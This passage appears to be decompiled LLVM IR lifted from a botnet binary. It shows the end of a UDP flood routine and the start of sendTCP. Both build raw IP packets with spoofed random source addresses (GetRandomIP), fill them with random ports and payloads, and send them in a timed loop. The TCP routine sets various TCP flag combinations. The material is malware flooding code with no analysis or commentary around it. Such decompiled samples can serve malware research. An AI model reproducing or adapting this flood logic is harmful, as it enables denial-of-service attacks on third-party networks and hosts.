  %v5_e528 = call i32 @makeIPPacket(i8* %v4_e528, i32 %v0_e520, i32 %v1_e508, i32 17)
  %v3_e52c = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_e52c, 8
  %v3_e540 = urem i32 %fold, 65536
  store i32 %v3_e540, i32* %r3.global-to-local, align 4
  %v1_e548 = call i32 @htons(i32 %v3_e540)
  %sext = mul i32 %v1_e548, 16777216
  %v1_e54c = sdiv i32 %sext, 16777216
  store i32 %v1_e54c, i32* %r3.global-to-local, align 4
  store i32 %v1_e4ec, i32* %r2.global-to-local, align 4
  %v1_e554 = trunc i32 %v1_e54c to i8
  %v3_e554 = add i32 %v3_e4cc, 24
  %v4_e554 = inttoptr i32 %v3_e554 to i8*
  store i8 %v1_e554, i8* %v4_e554, align 4
  %v0_e558 = load i32, i32* %r3.global-to-local, align 4
  %v3_e558 = sdiv i32 %v0_e558, 256
  store i32 %v3_e558, i32* %r3.global-to-local, align 4
  %v1_e55c = trunc i32 %v3_e558 to i8
  %v2_e55c = load i32, i32* %r2.global-to-local, align 4
  %v3_e55c = add i32 %v2_e55c, 5
  %v4_e55c = inttoptr i32 %v3_e55c to i8*
  store i8 %v1_e55c, i8* %v4_e55c, align 1
  %v0_e560 = call i32 @rand_cmwc()
  %v3_e56c = urem i32 %v0_e560, 65536
  store i32 %v3_e56c, i32* %r3.global-to-local, align 4
  store i32 %v1_e4ec, i32* %r2.global-to-local, align 4
  %v1_e574 = trunc i32 %v0_e560 to i8
  store i8 %v1_e574, i8* %v5_e4f0, align 4
  %v0_e578 = load i32, i32* %r3.global-to-local, align 4
  %v3_e57836 = udiv i32 %v0_e578, 256
  %v1_e57c = trunc i32 %v3_e57836 to i8
  %v2_e57c = load i32, i32* %r2.global-to-local, align 4
  %v3_e57c = add i32 %v2_e57c, 1
  %v4_e57c = inttoptr i32 %v3_e57c to i8*
  store i8 %v1_e57c, i8* %v4_e57c, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_e154, label %dec_label_pc_e58c, label %dec_label_pc_e5a4

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e498
  %v0_e58c = call i32 @rand_cmwc()
  %v3_e594 = mul i32 %v0_e58c, 65536
  store i32 %v3_e594, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_e58c to i8
  br label %dec_label_pc_e5c0

dec_label_pc_e5a4:                                ; preds = %dec_label_pc_e498
  %v3_e5ac = urem i32 %arg2, 65536
  store i32 %v3_e5ac, i32* %r3.global-to-local, align 4
  %v1_e5b4 = call i32 @htons(i32 %v3_e5ac)
  %extract.t102 = trunc i32 %v1_e5b4 to i8
  br label %dec_label_pc_e5c0

dec_label_pc_e5c0:                                ; preds = %dec_label_pc_e58c, %dec_label_pc_e5a4
  %v0_e58c.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_e58c ], [ %extract.t102, %dec_label_pc_e5a4 ]
  %v3_e6d8.pre-phi = phi i32 [ 0, %dec_label_pc_e58c ], [ %v3_e5ac, %dec_label_pc_e5a4 ]
  store i32 %v1_e4ec, i32* %r2.global-to-local, align 4
  %v4_e5c4 = sext i8 %v0_e58c.sink.off0 to i32
  %v3_e5c8 = add i32 %v3_e4cc, 22
  %v4_e5c8 = inttoptr i32 %v3_e5c8 to i8*
  store i8 %v0_e58c.sink.off0, i8* %v4_e5c8, align 2
  %v3_e5d040 = udiv i32 %v4_e5c4, 256
  %v1_e5d4 = trunc i32 %v3_e5d040 to i8
  %v2_e5d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_e5d4 = add i32 %v2_e5d4, 3
  %v4_e5d4 = inttoptr i32 %v3_e5d4 to i8*
  store i8 %v1_e5d4, i8* %v4_e5d4, align 1
  store i32 %v1_e4ec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e5e0 = add i32 %v3_e4cc, 26
  %v4_e5e0 = inttoptr i32 %v3_e5e0 to i8*
  store i8 0, i8* %v4_e5e0, align 2
  %v0_e5e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e5e4 = trunc i32 %v0_e5e4 to i8
  %v2_e5e4 = load i32, i32* %r2.global-to-local, align 4
  %v3_e5e4 = add i32 %v2_e5e4, 7
  %v4_e5e4 = inttoptr i32 %v3_e5e4 to i8*
  store i8 %v1_e5e4, i8* %v4_e5e4, align 1
  %v1_e5ec = add i32 %v3_e4cc, 28
  store i32 %v1_e5ec, i32* %r3.global-to-local, align 4
  %v3_e5f4 = load i32, i32* %stack_var_0, align 4
  %v2_e5f8 = call i32 @makeRandomStr(i32 %v1_e5ec, i32 %v3_e5f4)
  %v1_e608 = or i32 %v3_e4cc, 2
  store i32 %v1_e608, i32* %r3.global-to-local, align 4
  %v1_e60c = inttoptr i32 %v1_e608 to i8*
  %v2_e60c = load i8, i8* %v1_e60c, align 2
  %v3_e60c = zext i8 %v2_e60c to i32
  store i32 %v3_e60c, i32* %r2.global-to-local, align 4
  %v1_e610 = or i32 %v1_e4c8, 3
  %v2_e610 = inttoptr i32 %v1_e610 to i8*
  %v3_e610 = load i8, i8* %v2_e610, align 1
  %v4_e610 = zext i8 %v3_e610 to i32
  %v4_e614 = mul nuw nsw i32 %v4_e610, 256
  %v5_e614 = or i32 %v4_e614, %v3_e60c
  store i32 %v5_e614, i32* %r3.global-to-local, align 4
  %v3_e620 = call i32 @csum(i8* %v4_e528, i32 %v5_e614)
  %sext6 = mul i32 %v3_e620, 16777216
  %v1_e624 = sdiv i32 %sext6, 16777216
  store i32 %v1_e624, i32* %r3.global-to-local, align 4
  store i32 %v3_e4cc, i32* %r2.global-to-local, align 4
  %v1_e62c = trunc i32 %v1_e624 to i8
  %v3_e62c = add i32 %v3_e4cc, 10
  %v4_e62c = inttoptr i32 %v3_e62c to i8*
  store i8 %v1_e62c, i8* %v4_e62c, align 2
  %v0_e630 = load i32, i32* %r3.global-to-local, align 4
  %v3_e630 = sdiv i32 %v0_e630, 256
  store i32 %v3_e630, i32* %r3.global-to-local, align 4
  %v1_e634 = trunc i32 %v3_e630 to i8
  %v2_e634 = load i32, i32* %r2.global-to-local, align 4
  %v3_e634 = add i32 %v2_e634, 11
  %v4_e634 = inttoptr i32 %v3_e634 to i8*
  store i8 %v1_e634, i8* %v4_e634, align 1
  %v2_e63c = call i32 @__GI_time(i32* null)
  %v2_e648 = add i32 %v2_e63c, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e718 = add i32 %v3_e4cc, 4
  %v4_e718 = inttoptr i32 %v3_e718 to i8*
  %v2_e740 = add i32 %v3_e4cc, 12
  %v3_e740 = inttoptr i32 %v2_e740 to i32*
  %v3_e7d8 = mul i32 %arg8, 4
  %v3_e7e8 = mul i32 %arg8, 1000
  br label %dec_label_pc_e664.outer

dec_label_pc_e664.outer:                          ; preds = %dec_label_pc_e800, %dec_label_pc_e7d0, %dec_label_pc_e5c0
  %stack_var_-104.0.ph = phi i32 [ 0, %dec_label_pc_e5c0 ], [ %v1_e7b8, %dec_label_pc_e7d0 ], [ %v1_e7b8, %dec_label_pc_e800 ]
  %stack_var_-100.0.ph = phi i32 [ 0, %dec_label_pc_e5c0 ], [ 0, %dec_label_pc_e7d0 ], [ %v1_e804, %dec_label_pc_e800 ]
  br label %dec_label_pc_e664

dec_label_pc_e664:                                ; preds = %dec_label_pc_e664.outer, %dec_label_pc_e7a8
  %stack_var_-104.0 = phi i32 [ 0, %dec_label_pc_e7a8 ], [ %stack_var_-104.0.ph, %dec_label_pc_e664.outer ]
  store i32 %v3_e4cc, i32* %r2.global-to-local, align 4
  %v1_e66c = load i32, i32* @sp, align 4
  %v2_e66c = inttoptr i32 %v1_e66c to i32*
  store i32 %v2_e1c0, i32* %v2_e66c, align 4
  %v1_e674 = load i32, i32* @sp, align 4
  %v2_e674 = add i32 %v1_e674, 4
  %v3_e674 = inttoptr i32 %v2_e674 to i32*
  store i32 16, i32* %v3_e674, align 4
  %v0_e67c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_e49c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_e688 = inttoptr i32 %v0_e67c to i32*
  %v7_e688 = call i32 @__libc_sendto(i32 %v0_e394, i32* %v6_e688, i32 %v1_e49c, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_e68c = call i32 @rand_cmwc()
  %v3_e698 = urem i32 %v0_e68c, 65536
  store i32 %v3_e698, i32* %r3.global-to-local, align 4
  store i32 %v1_e4ec, i32* %r2.global-to-local, align 4
  %v1_e6a0 = trunc i32 %v0_e68c to i8
  store i8 %v1_e6a0, i8* %v5_e4f0, align 4
  %v0_e6a4 = load i32, i32* %r3.global-to-local, align 4
  %v3_e6a441 = udiv i32 %v0_e6a4, 256
  %v1_e6a8 = trunc i32 %v3_e6a441 to i8
  %v2_e6a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_e6a8 = add i32 %v2_e6a8, 1
  %v4_e6a8 = inttoptr i32 %v3_e6a8 to i8*
  store i8 %v1_e6a8, i8* %v4_e6a8, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_e154, label %dec_label_pc_e6b8, label %dec_label_pc_e6d0

dec_label_pc_e6b8:                                ; preds = %dec_label_pc_e664
  %v0_e6b8 = call i32 @rand_cmwc()
  %v3_e6c0 = mul i32 %v0_e6b8, 65536
  store i32 %v3_e6c0, i32* %r3.global-to-local, align 4
  %extract.t103 = trunc i32 %v0_e6b8 to i8
  br label %dec_label_pc_e6ec

dec_label_pc_e6d0:                                ; preds = %dec_label_pc_e664
  store i32 %v3_e6d8.pre-phi, i32* %r3.global-to-local, align 4
  %v1_e6e0 = call i32 @htons(i32 %v3_e6d8.pre-phi)
  %extract.t104 = trunc i32 %v1_e6e0 to i8
  br label %dec_label_pc_e6ec

dec_label_pc_e6ec:                                ; preds = %dec_label_pc_e6b8, %dec_label_pc_e6d0
  %v0_e6b8.sink.off0 = phi i8 [ %extract.t103, %dec_label_pc_e6b8 ], [ %extract.t104, %dec_label_pc_e6d0 ]
  store i32 %v1_e4ec, i32* %r2.global-to-local, align 4
  %v4_e6f0 = sext i8 %v0_e6b8.sink.off0 to i32
  store i8 %v0_e6b8.sink.off0, i8* %v4_e5c8, align 2
  %v3_e6fc = sdiv i32 %v4_e6f0, 256
  store i32 %v3_e6fc, i32* %r3.global-to-local, align 4
  %v1_e700 = trunc i32 %v3_e6fc to i8
  %v2_e700 = load i32, i32* %r2.global-to-local, align 4
  %v3_e700 = add i32 %v2_e700, 3
  %v4_e700 = inttoptr i32 %v3_e700 to i8*
  store i8 %v1_e700, i8* %v4_e700, align 1
  %v0_e704 = call i32 @rand_cmwc()
  %v3_e710 = urem i32 %v0_e704, 65536
  store i32 %v3_e710, i32* %r3.global-to-local, align 4
  store i32 %v3_e4cc, i32* %r2.global-to-local, align 4
  %v1_e718 = trunc i32 %v0_e704 to i8
  store i8 %v1_e718, i8* %v4_e718, align 4
  %v0_e71c = load i32, i32* %r3.global-to-local, align 4
  %v3_e71c = sdiv i32 %v0_e71c, 256
  store i32 %v3_e71c, i32* %r3.global-to-local, align 4
  %v1_e720 = trunc i32 %v3_e71c to i8
  %v2_e720 = load i32, i32* %r2.global-to-local, align 4
  %v3_e720 = add i32 %v2_e720, 5
  %v4_e720 = inttoptr i32 %v3_e720 to i8*
  store i8 %v1_e720, i8* %v4_e720, align 1
  %v1_e728 = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_e728, i32* %r3.global-to-local, align 4
  %v1_e734 = call i32 @htonl(i32 %v1_e728)
  store i32 %v1_e734, i32* %r2.global-to-local, align 4
  store i32 %v1_e734, i32* %v3_e740, align 4
  store i32 %v1_e608, i32* %r3.global-to-local, align 4
  %v2_e754 = load i8, i8* %v1_e60c, align 2
  %v3_e754 = zext i8 %v2_e754 to i32
  store i32 %v3_e754, i32* %r2.global-to-local, align 4
  %v3_e758 = load i8, i8* %v2_e610, align 1
  %v4_e758 = zext i8 %v3_e758 to i32
  %v4_e75c = mul nuw nsw i32 %v4_e758, 256
  %v5_e75c = or i32 %v4_e75c, %v3_e754
  store i32 %v5_e75c, i32* %r3.global-to-local, align 4
  %v3_e768 = call i32 @csum(i8* %v4_e528, i32 %v5_e75c)
  %sext7 = mul i32 %v3_e768, 16777216
  %v1_e76c = sdiv i32 %sext7, 16777216
  store i32 %v1_e76c, i32* %r3.global-to-local, align 4
  store i32 %v3_e4cc, i32* %r2.global-to-local, align 4
  %v1_e774 = trunc i32 %v1_e76c to i8
  store i8 %v1_e774, i8* %v4_e62c, align 2
  %v0_e778 = load i32, i32* %r3.global-to-local, align 4
  %v3_e77845 = udiv i32 %v0_e778, 256
  %v1_e77c = trunc i32 %v3_e77845 to i8
  %v2_e77c = load i32, i32* %r2.global-to-local, align 4
  %v3_e77c = add i32 %v2_e77c, 11
  %v4_e77c = inttoptr i32 %v3_e77c to i8*
  store i8 %v1_e77c, i8* %v4_e77c, align 1
  store i32 %stack_var_-104.0, i32* %r2.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v9_e788 = icmp eq i32 %stack_var_-104.0, %arg6
  br i1 %v9_e788, label %dec_label_pc_e790, label %dec_label_pc_e7b4

dec_label_pc_e790:                                ; preds = %dec_label_pc_e6ec
  %v2_e794 = call i32 @__GI_time(i32* null)
  store i32 %v2_e794, i32* %r2.global-to-local, align 4
  store i32 %v2_e648, i32* %r3.global-to-local, align 4
  %v8_e7a4 = icmp sgt i32 %v2_e794, %v2_e648
  br i1 %v8_e7a4, label %dec_label_pc_e810, label %dec_label_pc_e7a8

dec_label_pc_e7a8:                                ; preds = %dec_label_pc_e790
  br label %dec_label_pc_e664

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_e6ec
  %v1_e7b8 = add i32 %stack_var_-104.0, 1
  store i32 %v1_e7b8, i32* %r2.global-to-local, align 4
  store i32 %arg7, i32* %r3.global-to-local, align 4
  %v9_e7c8 = icmp eq i32 %stack_var_-100.0.ph, %arg7
  br i1 %v9_e7c8, label %dec_label_pc_e7d0, label %dec_label_pc_e800

dec_label_pc_e7d0:                                ; preds = %dec_label_pc_e7b4
  store i32 %v3_e7d8, i32* %r2.global-to-local, align 4
  store i32 %v3_e7e8, i32* %r3.global-to-local, align 4
  %v1_e7f0 = call i32 @usleep(i32 %v3_e7e8)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e664.outer

dec_label_pc_e800:                                ; preds = %dec_label_pc_e7b4
  %v1_e804 = add i32 %stack_var_-100.0.ph, 1
  store i32 %v1_e804, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e664.outer

dec_label_pc_e810:                                ; preds = %dec_label_pc_e790, %dec_label_pc_e3f8, %dec_label_pc_e3ac
  %v12_e81833 = phi i32 [ %v3_e408, %dec_label_pc_e3f8 ], [ %v3_e3bc, %dec_label_pc_e3ac ], [ %v2_e794, %dec_label_pc_e790 ]
  br label %dec_label_pc_e814

dec_label_pc_e814:                                ; preds = %dec_label_pc_e300, %dec_label_pc_e1a0, %dec_label_pc_e228, %dec_label_pc_e210, %dec_label_pc_e810
  %v12_e818 = phi i32 [ %v3_e1b0, %dec_label_pc_e1a0 ], [ 0, %dec_label_pc_e228 ], [ %v3_e220, %dec_label_pc_e210 ], [ %v12_e81833, %dec_label_pc_e810 ], [ %v2_e304, %dec_label_pc_e300 ]
  store i32 %v3_e124, i32* @r4, align 4
  store i32 %v6_e124, i32* @fp, align 4
  ret i32 %v12_e818

; uselistorder directives
  uselistorder i32 %v1_e804, { 1, 0 }
  uselistorder i32 %v1_e7b8, { 2, 1, 0 }
  uselistorder i32 %v1_e76c, { 1, 0 }
  uselistorder i32 %v3_e71c, { 1, 0 }
  uselistorder i32 %v0_e704, { 1, 0 }
  uselistorder i32 %v3_e6fc, { 1, 0 }
  uselistorder i8 %v0_e6b8.sink.off0, { 1, 0 }
  uselistorder i32 %v0_e6b8, { 1, 0 }
  uselistorder i32 %v0_e68c, { 1, 0 }
  uselistorder i32 %stack_var_-104.0, { 0, 2, 1 }
  uselistorder i32 %v3_e7e8, { 1, 0 }
  uselistorder i32 %v2_e648, { 1, 0 }
  uselistorder i32 %v3_e630, { 1, 0 }
  uselistorder i32 %v1_e624, { 1, 0 }
  uselistorder i32 %v1_e608, { 0, 2, 1 }
  uselistorder i32 %v3_e6d8.pre-phi, { 1, 0 }
  uselistorder i8 %v0_e58c.sink.off0, { 1, 0 }
  uselistorder i32 %v3_e5ac, { 2, 1, 0 }
  uselistorder i32 %v0_e58c, { 1, 0 }
  uselistorder i32 %v0_e560, { 1, 0 }
  uselistorder i32 %v3_e558, { 1, 0 }
  uselistorder i32 %v1_e54c, { 1, 0 }
  uselistorder i32 %v3_e540, { 1, 0 }
  uselistorder i32 %v3_e4cc, { 9, 7, 5, 8, 6, 3, 4, 14, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_e49c, { 1, 0 }
  uselistorder i32 %v1_e454, { 1, 0 }
  uselistorder i32 %v1_e328, { 1, 0 }
  uselistorder i32 %v3_e2a0, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v3_e358, { 1, 0 }
  uselistorder i32 %v2_e284, { 1, 0 }
  uselistorder i32 %v1_e234, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_e1c0, { 1, 0, 2 }
  uselistorder i32 %v3_e184, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 8, 9, 6, 7, 13, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 41, 40, 42, 43, 47, 44, 45, 46, 74, 48, 50, 49, 51, 52, 53, 55, 54, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 71, 72, 73, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32 26, { 0, 2, 1 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder label %dec_label_pc_e814, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_e6ec, { 1, 0 }
  uselistorder label %dec_label_pc_e664, { 1, 0 }
  uselistorder label %dec_label_pc_e5c0, { 1, 0 }
  uselistorder label %dec_label_pc_e498, { 1, 0 }
  uselistorder label %dec_label_pc_e41c, { 1, 0 }
  uselistorder label %dec_label_pc_e300, { 1, 0 }
  uselistorder label %dec_label_pc_e2a0, { 1, 0 }
  uselistorder label %dec_label_pc_e1a0, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_e82c = load i32, i32* @r4, align 4
  %v6_e82c = load i32, i32* @fp, align 4
  store i32 59444, i32* %stack_var_-4, align 4
  %v2_e830 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e830, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_e86c = icmp eq i32 %arg2, 0
  br i1 %v2_e86c, label %dec_label_pc_e874, label %dec_label_pc_e894

dec_label_pc_e874:                                ; preds = %entry
  %v0_e874 = call i32 @rand_cmwc()
  %v3_e87c = mul i32 %v0_e874, 65536
  store i32 %v3_e87c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e8b8

dec_label_pc_e894:                                ; preds = %entry
  %v3_e89c = urem i32 %arg2, 65536
  store i32 %v3_e89c, i32* %r3.global-to-local, align 4
  %v1_e8a4 = call i32 @htons(i32 %v3_e89c)
  br label %dec_label_pc_e8b8

dec_label_pc_e8b8:                                ; preds = %dec_label_pc_e874, %dec_label_pc_e894
  %v2_e8bc = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_e8bc, i32* %r3.global-to-local, align 4
  %v3_e8c8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_e8c8, i32* %r3.global-to-local, align 4
  %v2_e8d0 = icmp eq i32 %v3_e8c8, 0
  br i1 %v2_e8d0, label %dec_label_pc_e8dc, label %dec_label_pc_eeb4

dec_label_pc_e8dc:                                ; preds = %dec_label_pc_e8b8
  %v2_e8dc = ptrtoint i32* %stack_var_-64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r2, align 4
  %v0_e900 = call i32 @socket()
  store i32 %v0_e900, i32* %r3.global-to-local, align 4
  %v2_e910 = icmp eq i32 %v0_e900, 0
  br i1 %v2_e910, label %dec_label_pc_e918, label %dec_label_pc_e930

dec_label_pc_e918:                                ; preds = %dec_label_pc_e8dc
  %v2_e91c = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_e91c, i32* %r3.global-to-local, align 4
  %v3_e928 = call i32 @sockprintf(i32 %v2_e91c, i32 ptrtoint ([27 x i8]* @global_var_1b018.395 to i32))
  br label %dec_label_pc_eeb4

dec_label_pc_e930:                                ; preds = %dec_label_pc_e8dc
  store i32 1, i32* %stack_var_-68, align 4
  %v2_e938 = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_e938, i32* %r3.global-to-local, align 4
  %v6_e954 = call i32 @__GI_setsockopt(i32 %v0_e900, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_e954, i32* %r3.global-to-local, align 4
  %v1_e95c = icmp slt i32 %v6_e954, 0
  br i1 %v1_e95c, label %dec_label_pc_e964, label %dec_label_pc_e97c

dec_label_pc_e964:                                ; preds = %dec_label_pc_e930
  %v2_e968 = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_e968, i32* %r3.global-to-local, align 4
  %v3_e974 = call i32 @sockprintf(i32 %v2_e968, i32 ptrtoint ([33 x i8]* @global_var_1b034.397 to i32))
  br label %dec_label_pc_eeb4

dec_label_pc_e97c:                                ; preds = %dec_label_pc_e930
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_e980 = icmp eq i32 %arg4, 0
  br i1 %v2_e980, label %dec_label_pc_e9ac, label %dec_label_pc_e994

dec_label_pc_e994:                                ; preds = %dec_label_pc_e97c
  %v1_e998 = sub i32 32, %arg4
  store i32 %v1_e998, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_e9a4 = shl i32 -1, %v1_e998
  br label %dec_label_pc_e9ac

dec_label_pc_e9ac:                                ; preds = %dec_label_pc_e97c, %dec_label_pc_e994
  %storemerge10 = phi i32 [ %v1_e9a4, %dec_label_pc_e994 ], [ 0, %dec_label_pc_e97c ]
  %v1_e9b0 = add i32 %arg6, 40
  %v1_e9c0 = add i32 %arg6, 46
  %v3_e9c4 = and i32 %v1_e9c0, -4
  %v1_e9cc = load i32, i32* @sp, align 4
  %v2_e9cc = sub i32 %v1_e9cc, %v3_e9c4
  %v1_e9dc = add i32 %v2_e9cc, 11
  %v3_e9e0 = and i32 %v1_e9dc, -4
  store i32 %v3_e9e0, i32* %r2.global-to-local, align 4
  %v1_ea00 = add i32 %v3_e9e0, 20
  store i32 %v1_ea00, i32* %r3.global-to-local, align 4
  %v5_ea04 = inttoptr i32 %v1_ea00 to i8*
  %v3_ea08 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ea08, i32* @r4, align 4
  %v1_ea10 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_ea10, i32* %r3.global-to-local, align 4
  %v1_ea1c = call i32 @htonl(i32 %v1_ea10)
  store i32 %v1_ea1c, i32* %r2.global-to-local, align 4
  %v1_ea28 = add i32 %arg6, 20
  %v1_ea2c = load i32, i32* @sp, align 4
  %v2_ea2c = inttoptr i32 %v1_ea2c to i32*
  store i32 %v1_ea28, i32* %v2_ea2c, align 4
  %v0_ea34 = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_ea3c = inttoptr i32 %v3_e9e0 to i8*
  %v5_ea3c = call i32 @makeIPPacket(i8* %v4_ea3c, i32 %v0_ea34, i32 %v1_ea1c, i32 6)
  %v0_ea40 = call i32 @rand_cmwc()
  %v3_ea4c = urem i32 %v0_ea40, 65536
  store i32 %v3_ea4c, i32* %r3.global-to-local, align 4
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_ea54 = trunc i32 %v0_ea40 to i8
  store i8 %v1_ea54, i8* %v5_ea04, align 4
  %v0_ea58 = load i32, i32* %r3.global-to-local, align 4
  %v3_ea58 = sdiv i32 %v0_ea58, 256
  store i32 %v3_ea58, i32* %r3.global-to-local, align 4
  %v1_ea5c = trunc i32 %v3_ea58 to i8
  %v2_ea5c = load i32, i32* %r2.global-to-local, align 4
  %v3_ea5c = add i32 %v2_ea5c, 1
  %v4_ea5c = inttoptr i32 %v3_ea5c to i8*
  store i8 %v1_ea5c, i8* %v4_ea5c, align 1
  %v0_ea60 = call i32 @rand_cmwc()
  %v2_ea6c = add i32 %v3_e9e0, 24
  %v3_ea6c = inttoptr i32 %v2_ea6c to i32*
  store i32 %v0_ea60, i32* %v3_ea6c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ea78 = add i32 %v3_e9e0, 28
  %v3_ea78 = inttoptr i32 %v2_ea78 to i32*
  store i32 0, i32* %v3_ea78, align 4
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_ea80 = add i32 %v3_e9e0, 32
  %v2_ea80 = inttoptr i32 %v1_ea80 to i8*
  %v3_ea80 = load i8, i8* %v2_ea80, align 4
  %v1_ea8c = urem i8 %v3_ea80, 16
  %v1_ea90 = or i8 %v1_ea8c, 80
  store i8 %v1_ea90, i8* %v2_ea80, align 4
  %v3_eaa0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_eaa0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b058.402 to i32), i32* @r1, align 4
  %v3_eaac = inttoptr i32 %v3_eaa0 to i8*
  %v4_eaac = call i32 @__GI_strcoll(i8* %v3_eaac, i32 ptrtoint ([4 x i8]* @global_var_1b058.402 to i32))
  store i32 %v4_eaac, i32* %r3.global-to-local, align 4
  %v2_eab4 = icmp eq i32 %v4_eaac, 0
  br i1 %v2_eab4, label %dec_label_pc_eabc, label %dec_label_pc_eb10

dec_label_pc_eabc:                                ; preds = %dec_label_pc_e9ac
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v1_eac0 = add i32 %v3_e9e0, 33
  %v2_eac0 = inttoptr i32 %v1_eac0 to i8*
  %v3_eac0 = load i8, i8* %v2_eac0, align 1
  %v4_eac0 = zext i8 %v3_eac0 to i32
  %v1_eac4 = or i32 %v4_eac0, 2
  store i32 %v1_eac4, i32* %r3.global-to-local, align 4
  %v1_eac8 = trunc i32 %v1_eac4 to i8
  store i8 %v1_eac8, i8* %v2_eac0, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_ead0 = load i8, i8* %v2_eac0, align 1
  %v4_ead0 = zext i8 %v3_ead0 to i32
  %v1_ead4 = or i32 %v4_ead0, 4
  store i32 %v1_ead4, i32* %r3.global-to-local, align 4
  %v1_ead8 = trunc i32 %v1_ead4 to i8
  store i8 %v1_ead8, i8* %v2_eac0, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_eae0 = load i8, i8* %v2_eac0, align 1
  %v4_eae0 = zext i8 %v3_eae0 to i32
  %v1_eae4 = or i32 %v4_eae0, 1
  store i32 %v1_eae4, i32* %r3.global-to-local, align 4
  %v1_eae8 = trunc i32 %v1_eae4 to i8
  store i8 %v1_eae8, i8* %v2_eac0, align 1
  store i32 %v1_ea00, i32* %r2.global-to-local, align 4
  %v3_eaf0 = load i8, i8* %v2_eac0, align 1
  %v4_eaf0 = zext i8 %v3_eaf0 to i32
  %v1_eaf4 = or i32 %v4_eaf0, 16
  store i32 %v1_eaf4, i32* %r3.global-to-local, align 4
  %v1_eaf8 = trunc i32 %v1_eaf4 to i8
  store i8 %v1_eaf8, i8* %v2_eac0, align 1
